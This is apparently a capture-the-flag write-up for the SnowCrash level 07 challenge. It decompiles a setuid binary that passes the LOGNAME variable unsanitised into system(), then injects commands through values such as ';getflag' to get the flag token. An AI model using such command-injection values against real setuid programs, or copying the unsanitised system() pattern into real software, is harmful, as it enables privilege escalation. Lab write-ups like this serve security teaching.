# Level 07

Level 07 contains a setuid binary on the folder, running it prints the following:

```bash
level07@SnowCrash:~$ ls -l level07
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$ ./level07
level07
level07@SnowCrash:~$
```

let's copy it to our machine and open it with BinaryNinja, we can see the main function runs the command `echo` with the first argument from environement variable `LOGNAME`
 


```c
08048514  int32_t main(int32_t argc, char** argv, char** envp)
0804851d      gid_t eax = getegid()
08048526      uid_t eax_1 = geteuid()
08048546      setresgid(rgid: eax, egid: eax, sgid: eax)
08048562      setresuid(ruid: eax_1, euid: eax_1, suid: eax_1)
08048567      char* var_1c = nullptr
0804858e      asprintf(string_ptr: &var_1c, format: "/bin/echo %s ", getenv(name: "LOGNAME"))
080485a0      return system(line: var_1c)
```

the problem is that binary inserts the value of `LOGNAME` directly into the command without any sanitization, this means that we can control the command that will be executed by setting the `LOGNAME` variable to a command of our choice.

```bash
level07@SnowCrash:~$ LOGNAME=';id' ./level07

uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
level07@SnowCrash:~$ LOGNAME=';getflag' ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$
```